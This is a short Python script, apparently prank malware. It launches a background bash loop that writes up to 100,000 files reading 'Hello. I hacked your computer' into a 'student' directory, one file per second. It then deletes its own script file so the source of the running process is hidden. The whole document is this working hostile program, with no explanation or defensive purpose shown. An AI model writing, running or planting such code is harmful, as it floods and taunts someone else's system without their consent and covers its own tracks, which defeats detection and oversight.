from os import remove
from sys import argv
import subprocess

p1 = subprocess.Popen(["/bin/bash", '-c', "for i in {1..100000}; do echo 'Hello. I hacked your computer' > student/strange_file$i.txt; sleep 1; done"])
    
remove(argv[0])